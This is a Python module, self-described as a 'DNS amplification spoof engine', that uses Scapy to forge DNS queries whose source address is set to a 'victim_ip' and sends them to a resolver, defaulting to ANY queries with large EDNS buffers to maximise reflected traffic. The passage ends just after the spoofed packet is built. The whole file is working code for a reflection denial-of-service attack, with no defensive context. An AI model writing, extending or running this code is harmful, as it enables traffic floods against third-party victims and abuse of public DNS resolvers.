"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns